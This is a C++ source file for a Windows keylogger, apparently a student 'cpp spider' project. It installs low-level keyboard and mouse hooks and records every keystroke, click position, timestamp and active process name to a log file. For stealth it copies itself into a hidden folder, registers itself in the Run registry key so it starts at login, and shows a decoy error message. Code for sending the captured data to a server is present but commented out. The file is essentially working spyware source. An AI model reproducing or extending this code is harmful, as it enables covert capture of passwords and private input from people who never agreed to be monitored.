#include "stdafx.h"
#include "keylogger.h"

struct Packet			*str;
int						mouseX = 0;
int						mouseY = 0;

KeyLogger::KeyLogger(int argc, char **argv)
{
	BOOL				ok = FALSE;
	std::string			text;
	std::ifstream		f_install("KL-ec.install", std::ios::in);
	HWND				hwnd = GetConsoleWindow();

	//ShowWindow(hwnd, 0); //to uncomment (hide window, kill program with task manager)
	std::cout << "Impossible d'executer ce logiciel" << std::endl;
	if (f_install)
	{
		getline(f_install, text);
		std::cout << text << std::endl;
		if (text == INSTALL_TEXT)
			ok = TRUE;
		f_install.close();
		_dir = ".";
	}
	if (ok == FALSE)
		install();
}

KeyLogger::~KeyLogger()
{
	UnhookWindowsHookEx(hKeyboardHook);
	UnhookWindowsHookEx(hMouseHook);
	fclose(_logsFile);
}

void					KeyLogger::movekl(std::string from, std::string to)
{
	system(std::string("COPY " + from + " " + to).c_str());
}

void					KeyLogger::hidekl(std::string folder)
{
	system(std::string("attrib +h " + folder).c_str());
}

void					KeyLogger::addToStartupApplication()
{
	HKEY hkey = NULL;
	CString csPath = "C:\\KL-ec\\KL-ec.exe";
	HRESULT hres = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	hres = RegSetValueEx(hkey, L"cpp spider", 0, REG_SZ, (BYTE*)csPath.GetBuffer(), (wcslen(csPath) + 1) * 2);
}

void					KeyLogger::install()
{
	std::string			dir(INSTALL_DOSSIER);

	if (_access(INSTALL_DOSSIER, 00) != 0)
		dir = ".";
	dir += "\\KL-ec";
	_mkdir(dir.c_str());
	movekl("cpp_spider.exe", dir + "\\KL-ec.exe");
	hidekl("C:\\KL-ec");
	std::ofstream installFile(dir + "\\KL-ec.install", std::ofstream::out);
	installFile << INSTALL_TEXT << std::endl;
	installFile.close();
	_dir = dir;
	addToStartupApplication();
}

void					writeToLogsFile(std::string str)
{
	FILE				*logsFile;
	const char *c = str.c_str();

	fopen_s(&logsFile, "C:\\KL-ec\\KL-ec.save", "a");
	fprintf(logsFile, c, "a");
	fclose(logsFile);
}

void					fillStructValue(struct Packet *str, const char *activeProcess)
{
	int					i = 0;
	int					length = strlen(activeProcess);

	while (i != length)
	{
		str->process_name[i] = activeProcess[i];
		i++;
	}
	str->process_name[i] = '\0';
}
void					prepareStr()
{
	size_t				size;
	std::time_t			timestamp = std::time(nullptr);

	size = sizeof(struct Packet) + sizeof(char) * (getActiveProcess().length() + 1);
	str = (struct Packet *)calloc(1, size);
	str->size = size;
	str->timestamp = timestamp;
	str->mouseX = mouseX;
	str->mouseY = mouseY;
	fillStructValue(str, getActiveProcess().c_str());
}
LRESULT CALLBACK		KeyLogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	static int			last;
	static BOOL			capslock = 0;
	static BOOL			isShiftDown = 0;
	static BOOL			isAltgrDown = 0;
	POINT				pt;

	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		int code = p->vkCode;
		if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
		{
			if (code == 0xA2)
			{
				last = code;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			else if (code == 0xA0 || code == 0xA1)
				isShiftDown = 0;
			else if (code == 0x14)
				(capslock == 0) ? capslock = 1 : capslock = 0;
			else if (last == 0xA2 && code == 0xA5)
				isAltgrDown = 0;
			last = code;
		}
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			GetCursorPos(&pt);
			mouseX = pt.x;
			mouseY = pt.y;
			prepareStr();
			translateNormalKeyForSending(code, last, str);
			//m_com.get()->send_str(str, str->size);
			//std::cerr << "sended" << '\n';
			if (code == 0xA2)
			{
				last = code;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			if (code == 0xA0 || code == 0xA1)
				isShiftDown = 1;
			else if (last == 0xA2 && code == 0xA5)
				isAltgrDown = 1;
			else
			{
				if (capslock == 1 || isShiftDown == 1)
					writeToLogsFile(translateUpperKey(code));
				else if (isAltgrDown == 1)
					writeToLogsFile(translateAltgrKey(code));
				else
					writeToLogsFile(translateNormalKey(code, last));
			}
			last = code;
			free(str);
		}
	}
	return (CallNextHookEx (NULL, nCode, wParam, lParam));
}

bool					checkCurrentProcess(TCHAR *buffer, DWORD cchLen)
{
	HWND				fg = GetForegroundWindow();

	if (fg)
	{
		DWORD pid;
		GetWindowThreadProcessId(fg, &pid);
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
		if (hProcess)
		{
			BOOL ret = QueryFullProcessImageName(hProcess, 0, buffer, &cchLen);
			CloseHandle(hProcess);
			return (ret != FALSE);
		}
	}
	return (false);
}

std::string				getActiveProcess()
{
	TCHAR				buffer[MAX_PATH];

	if (checkCurrentProcess(buffer, MAX_PATH))
	{
		std::wstring bob = &buffer[0];
		std::string bill(bob.begin(), bob.end());
		return (bill);
	}
	else
		return ("");
}

LRESULT CALLBACK		KeyLogger::mouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MOUSEHOOKSTRUCT		*pMouseStruct = (MOUSEHOOKSTRUCT *)lParam;
	SYSTEMTIME			st;

	if (pMouseStruct != NULL)
	{
		pMouseStruct->pt.x <= -1 ? mouseX = 0 : mouseX = pMouseStruct->pt.x;
		pMouseStruct->pt.y <= -1 ? mouseY = 0 : mouseY = pMouseStruct->pt.y;
		switch (wParam)
		{
			case WM_LBUTTONDOWN:
				prepareStr();
				GetSystemTime(&st);
				writeToLogsFile("\n<Left click>\n");
				writeToLogsFile("Active process: " + getActiveProcess() + "\n");
				writeToLogsFile("X = " + std::to_string(pMouseStruct->pt.x) + "\tY = " + std::to_string(pMouseStruct->pt.y) + "\ttime: " + std::to_string(st.wDay) + "/" + std::to_string(st.wMonth) + "/" + std::to_string(st.wYear) + " " + std::to_string(st.wHour) + ":" + std::to_string(st.wMinute) + ":" + std::to_string(st.wSecond) + "\n");
				str->modifier |= MouseButton;
				str->value = 0;
				//m_com.get()->send_str(str, str->size);
				//std::cerr << "sended" << '\n';
				free(str);
				break;
			case WM_RBUTTONDOWN:
				prepareStr();
				GetSystemTime(&st);
				writeToLogsFile("\n<Right click>\n");
				writeToLogsFile("Active process: " + getActiveProcess() + "\n");
				writeToLogsFile("X = " + std::to_string(pMouseStruct->pt.x) + "\tY = " + std::to_string(pMouseStruct->pt.y) + "\ttime: " + std::to_string(st.wDay) + "/" + std::to_string(st.wMonth) + "/" + std::to_string(st.wYear) + " " + std::to_string(st.wHour) + ":" + std::to_string(st.wMinute) + ":" + std::to_string(st.wSecond) + "\n");
				str->modifier |= MouseButton;
				str->value = 1;
				//m_com.get()->send_str(str, str->size);
				//std::cerr << "sended" << '\n';
				free(str);
				break;
			case WM_MBUTTONDOWN:
				prepareStr();
				GetSystemTime(&st);
				writeToLogsFile("\n<Middle click>\n");
				writeToLogsFile("Active process: " + getActiveProcess() + "\n");
				writeToLogsFile("X = " + std::to_string(pMouseStruct->pt.x) + "\tY = " + std::to_string(pMouseStruct->pt.y) + "\ttime: " + std::to_string(st.wDay) + "/" + std::to_string(st.wMonth) + "/" + std::to_string(st.wYear) + " " + std::to_string(st.wHour) + ":" + std::to_string(st.wMinute) + ":" + std::to_string(st.wSecond) + "\n");
				str->modifier |= MouseButton;
				str->value = 2;
				//m_com.get()->send_str(str, str->size);
				//std::cerr << "sended" << '\n';
				free(str);
				break;
		}
	}
	return (CallNextHookEx(NULL, nCode, wParam, lParam));
}

int						KeyLogger::readClientInput()
{
	MSG					msg;

	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardProc, 0, 0);
	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)mouseProc, 0, 0);
	while (!GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return (0);
}